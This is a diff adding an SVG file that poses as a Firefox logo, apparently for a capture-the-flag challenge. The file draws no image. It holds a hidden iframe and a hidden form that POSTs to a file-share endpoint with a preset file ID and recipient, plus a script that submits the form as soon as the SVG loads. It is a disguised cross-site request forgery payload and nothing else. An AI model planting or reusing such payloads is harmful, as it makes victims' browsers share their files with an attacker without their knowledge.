@@ -1,0 +1,9 @@
+<svg id="Firefox_-_Large" data-name="Firefox - Large" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1024 1024" width="800" height="800">
+  <iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='https://chall.secdriven.dev/file/share' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='file_id' value='133711377731'>
+  <input type='hidden' name='to' value='40565678603558'>
+  <input type='submit' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+</svg>
